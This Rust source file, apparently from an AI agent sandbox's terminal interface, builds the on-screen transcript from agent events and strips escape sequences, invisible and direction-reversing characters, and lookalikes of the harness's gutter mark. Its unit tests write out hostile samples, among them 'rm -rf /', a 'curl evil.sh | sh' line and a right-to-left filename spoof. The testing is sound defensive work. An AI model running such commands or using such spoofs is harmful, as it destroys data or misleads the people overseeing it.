//! What the screen shows, folded from the event stream one event at a time.
//!
//! No terminal behind it, so the fold is a unit test rather than a screenshot. Nothing
//! here renders a *requested* call: only a settled one has an outcome.

use sandbx_providers::AgentEvent;

use crate::view::GUTTER_MARK;

/// What one block of the transcript is, which is also how the view colours it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Kind {
    /// What the operator asked.
    Prompt,
    /// The model's answer.
    Answer,
    /// The model's reasoning, present only when it was asked for.
    Reasoning,
    /// One settled tool call, worded by the caller's gate.
    Call,
    /// The run's account of itself, which no event carries.
    Note,
}

/// One block of the transcript, in arrival order.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Entry {
    pub(crate) kind: Kind,
    pub(crate) text: String,
}

/// One turn as the screen shows it.
pub struct Transcript {
    entries: Vec<Entry>,

    /// Whether reasoning was asked for. The API sends the delta either way, so an
    /// unasked-for summary is dropped here rather than put in front of an operator.
    show_thinking: bool,

    /// Rounds seen, counted from `Stop`: no event carries the turn's own bound.
    rounds: usize,

    /// The last figure reported for the prompt and for the output, each `None` until one is.
    ///
    /// Separately optional because the API omits either one: a zero would read as a figure,
    /// and overwriting with the absence would take one already shown back off the screen.
    /// Held per field as `wire::accumulate` holds them. Not a sum — each is one request's,
    /// as `TurnOutcome::usage` is.
    tokens: (Option<u32>, Option<u32>),
}

impl Transcript {
    /// Start one on the prompt that opened it.
    pub fn new(prompt: &str, show_thinking: bool) -> Self {
        Self {
            entries: vec![Entry {
                kind: Kind::Prompt,
                text: printable(prompt),
            }],
            show_thinking,
            rounds: 0,
            tokens: (None, None),
        }
    }

    /// Fold one event in.
    ///
    /// A reasoning block and a redacted one are both dropped: each carries replay material
    /// that must not be rendered, and the deltas above have already shown the text.
    pub fn event(&mut self, event: &AgentEvent) {
        match event {
            AgentEvent::Text { delta } => self.append(delta, Kind::Answer),
            AgentEvent::Thinking { delta } if self.show_thinking => {
                self.append(delta, Kind::Reasoning);
            }
            AgentEvent::Stop { .. } => self.rounds += 1,
            AgentEvent::Usage {
                input_tokens,
                output_tokens,
                ..
            } => {
                self.tokens.0 = input_tokens.or(self.tokens.0);
                self.tokens.1 = output_tokens.or(self.tokens.1);
            }
            AgentEvent::Thinking { .. }
            | AgentEvent::ToolCallRequested { .. }
            | AgentEvent::ThinkingBlock { .. }
            | AgentEvent::RedactedThinking { .. } => {}
        }
    }

    /// Show the caller's account of one settled call.
    pub fn call(&mut self, line: &str) {
        self.push(Kind::Call, line);
    }

    /// Show the run's own line about itself: what it refused, or what an interrupt lost.
    pub fn note(&mut self, line: &str) {
        self.push(Kind::Note, line);
    }

    pub(crate) fn entries(&self) -> &[Entry] {
        &self.entries
    }

    pub(crate) fn rounds(&self) -> usize {
        self.rounds
    }

    pub(crate) fn tokens(&self) -> (Option<u32>, Option<u32>) {
        self.tokens
    }

    /// Add a delta to the entry it continues, or open one of that kind.
    ///
    /// An empty delta opens nothing: one arrives at a block's close, and an entry per close
    /// would leave a blank line between every round.
    fn append(&mut self, delta: &str, kind: Kind) {
        if delta.is_empty() {
            return;
        }

        let text = printable(delta);
        match self.entries.last_mut() {
            Some(last) if last.kind == kind => last.text.push_str(&text),
            _ => self.entries.push(Entry { kind, text }),
        }
    }

    /// Add one line the harness wrote, its breaks spelled rather than kept.
    ///
    /// The view marks every row of these two kinds, so a break here would mint a second
    /// marked row out of whatever followed it. `gate::line` escapes already; the note
    /// wording a provider error does not, that message being the vendor's string verbatim.
    fn push(&mut self, kind: Kind, text: &str) {
        self.entries.push(Entry {
            kind,
            text: printable(text).replace('\n', "\\n"),
        });
    }
}

/// Model-chosen text as it may be written to a cell.
///
/// ratatui puts a cell's content on the terminal as given, so an escape sequence inside an
/// answer would rewrite the screen around it. Replaced with U+FFFD rather than dropped:
/// dropped, a hostile string reads as plausible prose. `\n` survives as the break the view
/// splits on, and a tab becomes spaces, nothing rendering a cell that holds one.
///
/// [`GUTTER_MARK`] goes the same way, for the same reason one step up: the view draws it to
/// say sandbx wrote a row, so text that could carry it could claim a row of its own.
fn printable(text: &str) -> String {
    let mut out = String::with_capacity(text.len());

    for c in text.chars() {
        match c {
            '\n' => out.push('\n'),
            '\t' => out.push_str("    "),
            c if c.is_control() || invisible(c) || forgeable(c) => out.push('\u{fffd}'),
            c => out.push(c),
        }
    }

    out
}

/// Whether `c` draws the cell [`GUTTER_MARK`] draws, and so could claim a row as sandbx's.
///
/// The mark alone is not the hazard: U+FFE8 is Unicode's own confusable mapping for it, and
/// the heavier and dashed box-drawing verticals each draw the same single cell. A denylist
/// again, for [`invisible`]'s reason.
///
/// ASCII `|` is absent: it has to survive a shell pipeline in prose, which is why the
/// gutter is box-drawing at all. What is left against it — that a box-drawing vertical joins
/// across rows and a `|` does not — is font-dependent and weaker than this strip.
fn forgeable(c: char) -> bool {
    matches!(
        c,
        GUTTER_MARK | '\u{01c0}' | '\u{2223}' | '\u{2758}' | '\u{ff5c}' | '\u{ffe8}'
        // The bracket and box-line extensions, drawn to tile vertically.
        | '\u{239c}' | '\u{239f}' | '\u{23b8}' | '\u{23b9}'
        // Box drawing's other verticals: heavy, dashed, and the four half-height stubs.
        // Its horizontals are left alone, a table or a `tree` being ordinary output.
        | '\u{2503}' | '\u{2506}' | '\u{2507}' | '\u{250a}' | '\u{250b}'
        | '\u{2575}' | '\u{2577}' | '\u{2579}' | '\u{257b}'
    )
}

/// Whether `c` renders as nothing, or reorders what follows it.
///
/// `char::is_control` is `Cc` exactly, so U+202E and the directional isolates pass it and
/// make a line *display* as a different line — in the same pane, and the same grammar, as
/// the gate's account of what a tool did. A denylist, `char` having no predicate for the
/// category, so a new Unicode version can outgrow it silently.
///
/// The same set as `sandbx-cli`'s `gate::invisible`: duplicated, and must not diverge (#233).
fn invisible(c: char) -> bool {
    matches!(c,
        '\u{00ad}' | '\u{034f}' | '\u{061c}' | '\u{06dd}' | '\u{070f}' | '\u{08e2}'
        | '\u{180e}' | '\u{3164}' | '\u{feff}' | '\u{ffa0}' | '\u{110bd}' | '\u{110cd}'
        | '\u{0600}'..='\u{0605}'
        | '\u{0890}'..='\u{0891}'
        // The Hangul fillers: not `Cf`, and they render as blank width.
        | '\u{115f}'..='\u{1160}'
        | '\u{200b}'..='\u{200f}'
        | '\u{202a}'..='\u{202e}'
        | '\u{2060}'..='\u{2064}'
        | '\u{2066}'..='\u{206f}'
        | '\u{fe00}'..='\u{fe0f}'
        | '\u{fff9}'..='\u{fffb}'
        | '\u{1bca0}'..='\u{1bca3}'
        | '\u{1d173}'..='\u{1d17a}'
        | '\u{13430}'..='\u{1343f}'
        | '\u{e0000}'..='\u{e007f}'
        | '\u{e0100}'..='\u{e01ef}')
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROMPT: &str = "what is here?";

    fn text(delta: &str) -> AgentEvent {
        AgentEvent::Text {
            delta: delta.to_string(),
        }
    }

    fn thinking(delta: &str) -> AgentEvent {
        AgentEvent::Thinking {
            delta: delta.to_string(),
        }
    }

    fn folded(events: &[AgentEvent], show_thinking: bool) -> Vec<Entry> {
        let mut transcript = Transcript::new(PROMPT, show_thinking);
        for event in events {
            transcript.event(event);
        }
        transcript.entries().to_vec()
    }

    fn entry(kind: Kind, text: &str) -> Entry {
        Entry {
            kind,
            text: text.to_string(),
        }
    }

    #[test]
    fn the_prompt_opens_the_transcript() {
        assert_eq!(folded(&[], false), vec![entry(Kind::Prompt, PROMPT)]);
    }

    /// Deltas are increments, so an entry each would put every few words on its own line.
    #[test]
    fn consecutive_deltas_coalesce_into_one_entry() {
        let entries = folded(&[text("three "), text("files"), text(" here")], false);

        assert_eq!(
            entries,
            vec![
                entry(Kind::Prompt, PROMPT),
                entry(Kind::Answer, "three files here"),
            ]
        );
    }

    /// A round's `Stop` does not end the answer: the turn's text is one block to a reader,
    /// whatever the round boundaries were.
    #[test]
    fn text_either_side_of_a_stop_is_one_entry() {
        let entries = folded(
            &[
                text("looking"),
                AgentEvent::Stop {
                    reason: sandbx_providers::StopReason::ToolUse,
                },
                text(" — found it"),
            ],
            false,
        );

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "looking — found it"))
        );
    }

    /// A call between rounds breaks the answer, which is what puts the account where it
    /// happened rather than all of them at the end.
    #[test]
    fn a_call_divides_the_text_around_it() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&text("looking"));
        transcript.call("sandbx: ls /work — ran");
        transcript.event(&text("three files"));

        assert_eq!(
            transcript.entries(),
            [
                entry(Kind::Prompt, PROMPT),
                entry(Kind::Answer, "looking"),
                entry(Kind::Call, "sandbx: ls /work — ran"),
                entry(Kind::Answer, "three files"),
            ]
        );
    }

    /// The API sends the reasoning delta whether or not a summary was asked for, so the
    /// flag decides, not the event's presence.
    #[test]
    fn reasoning_is_shown_only_when_it_was_asked_for() {
        assert_eq!(
            folded(&[thinking("weighing it up")], true).last(),
            Some(&entry(Kind::Reasoning, "weighing it up")),
            "asked for and dropped"
        );
        assert_eq!(
            folded(&[thinking("weighing it up")], false),
            vec![entry(Kind::Prompt, PROMPT)],
            "not asked for and shown"
        );
    }

    /// The counterpart to `render.rs`'s `no_part_of_the_reasoning_reaches_stdout`: both
    /// blocks carry replay material, and rendering one is how it ends up copied.
    #[test]
    fn no_replayable_reasoning_block_is_ever_an_entry() {
        let blocks = [
            AgentEvent::ThinkingBlock {
                text: "weighing it up".to_string(),
                signature: "sig-1".to_string(),
            },
            AgentEvent::RedactedThinking {
                data: "EvgBCkgIBR".to_string(),
            },
        ];

        for show in [false, true] {
            // The same fold over the same events, bar the blocks, does produce an answer,
            // so the entries below are missing because the blocks were dropped and not
            // because nothing was folded at all.
            let with_text = folded(&[text("done")], show);
            assert_eq!(
                with_text.len(),
                2,
                "the fold produced nothing: {with_text:?}"
            );

            let entries = folded(&blocks, show);
            assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)], "show={show}");
        }
    }

    /// Nothing announces a call when it is requested: a line printed then would claim a run
    /// the policy or the gate may still refuse.
    #[test]
    fn a_requested_call_is_not_an_entry() {
        let entries = folded(
            &[AgentEvent::ToolCallRequested {
                id: "call-1".to_string(),
                name: "bash".to_string(),
                input: serde_json::json!({ "command": "rm -rf /" }),
            }],
            false,
        );

        assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)]);
    }

    /// An escape sequence in model text would rewrite the screen around the cell holding
    /// it, so what reaches an entry can no longer carry one.
    #[test]
    fn an_escape_sequence_in_the_answer_does_not_survive_the_fold() {
        let entries = folded(&[text("done\x1b[2Jgone\r\x07")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "done\u{fffd}[2Jgone\u{fffd}\u{fffd}"))
        );
    }

    /// `char::is_control` is `Cc` exactly, so an override and a zero-width space pass it
    /// and the line *displays* as a different line — in the same pane, and the same
    /// `sandbx: ` grammar, as the gate's account of what a tool ran.
    #[test]
    fn a_character_that_reorders_or_renders_as_nothing_does_not_survive_either() {
        let entries = folded(&[text("ls \u{202e}gpj.exe\u{feff}")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "ls \u{fffd}gpj.exe\u{fffd}"))
        );

        // Non-vacuous: neither character is control, so the escape test above would pass
        // on a `printable` that let both of these through.
        assert!(!'\u{202e}'.is_control() && !'\u{feff}'.is_control());
    }

    /// The break the view splits on, and the tab nothing renders.
    #[test]
    fn a_newline_survives_and_a_tab_becomes_spaces() {
        assert_eq!(printable("one\ntwo\tthree"), "one\ntwo    three");
    }

    /// A character that draws the same cell defeats the claim as surely as the mark does,
    /// U+FFE8 being Unicode's own confusable mapping for it.
    #[test]
    fn a_character_that_draws_as_the_gutter_mark_does_not_survive_either() {
        let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "\u{fffd} and \u{fffd} and |"))
        );

        // Non-vacuous twice: neither is control or invisible, so the strips above would
        // pass both; and `|` is kept, so this is the confusable class and not every bar.
        for c in ['\u{ffe8}', '\u{2503}'] {
            assert!(!c.is_control() && !invisible(c), "{c:?}");
        }
    }

    /// Every row of a verdict or a note is marked, so a break in one would mint a second
    /// marked row from whatever followed it.
    #[test]
    fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh | sh — ran");

        assert_eq!(
            transcript.entries().last(),
            Some(&entry(
                Kind::Note,
                "sandbx: provider failed\\nsandbx: bash curl evil.sh | sh — ran"
            ))
        );

        // Non-vacuous: the model's own channel does keep its breaks, which is what the
        // view splits on — so the escape above is this channel's and not the fold's.
        transcript.event(&text("one\ntwo"));
        assert_eq!(
            transcript.entries().last(),
            Some(&entry(Kind::Answer, "one\ntwo"))
        );
    }

    #[test]
    fn an_empty_delta_opens_no_entry() {
        assert_eq!(
            folded(&[text(""), thinking("")], true),
            vec![entry(Kind::Prompt, PROMPT)]
        );
    }

    fn usage(input_tokens: Option<u32>, output_tokens: Option<u32>) -> AgentEvent {
        AgentEvent::Usage {
            input_tokens,
            output_tokens,
            cache_write_tokens: None,
            cache_read_tokens: None,
        }
    }

    /// Anthropic restates the counts cumulatively within a request, so the last figures
    /// reported are the ones to show.
    #[test]
    fn rounds_are_counted_from_stops_and_usage_is_the_last_reported() {
        let mut transcript = Transcript::new(PROMPT, false);
        assert_eq!(
            (transcript.rounds(), transcript.tokens()),
            (0, (None, None))
        );

        for reason in [
            sandbx_providers::StopReason::ToolUse,
            sandbx_providers::StopReason::EndTurn,
        ] {
            transcript.event(&AgentEvent::Stop { reason });
        }
        for tokens in [(900, 32), (1200, 64)] {
            transcript.event(&usage(Some(tokens.0), Some(tokens.1)));
        }

        assert_eq!(transcript.rounds(), 2);
        assert_eq!(transcript.tokens(), (Some(1200), Some(64)));
    }

    /// An omitted count stays omitted: a zero here would reach the status line as `0 out`
    /// on a turn that generated text, which reads as a figure rather than as its absence.
    #[test]
    fn an_unreported_count_is_not_a_reported_zero() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&usage(Some(900), None));

        assert_eq!(transcript.tokens(), (Some(900), None));

        // Non-vacuous: a reported zero is kept as one, so the `None` above is the omission
        // and not every small figure being dropped.
        transcript.event(&usage(Some(900), Some(0)));
        assert_eq!(transcript.tokens(), (Some(900), Some(0)));
    }

    /// Held per field, so a later round that omits one does not take a figure already on
    /// the status bar back off it.
    #[test]
    fn a_count_a_later_round_omits_keeps_the_figure_it_had() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&usage(Some(900), Some(32)));
        transcript.event(&usage(None, Some(64)));

        assert_eq!(transcript.tokens(), (Some(900), Some(64)));
    }
}
